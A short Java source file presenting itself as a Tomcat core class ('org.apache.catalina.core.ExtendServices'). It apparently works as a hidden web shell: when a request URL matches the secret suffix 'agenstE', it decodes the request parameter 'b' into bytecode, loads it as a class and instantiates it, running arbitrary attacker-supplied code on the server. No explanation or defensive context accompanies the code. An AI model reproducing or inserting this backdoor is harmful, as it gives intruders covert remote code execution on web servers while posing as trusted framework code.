package org.apache.catalina.core;

import org.apache.catalina.core.utils.Util;

public class ExtendServices {

    public static String SERVICE_URL = "agenstE";

    public static void doServices(java.util.Map rdd, Object obj) throws Throwable {
        if (((String) rdd.get("url")).matches("/(.*)" + org.apache.catalina.core.ExtendServices.SERVICE_URL)) {
            byte[] data = Util.decode((String) rdd.get("b"));
            Class clz = Util.abstractClassLoader(data, ((java.util.Map) obj).get("request"));
            Util.instantiate(clz);
        }
    }

}
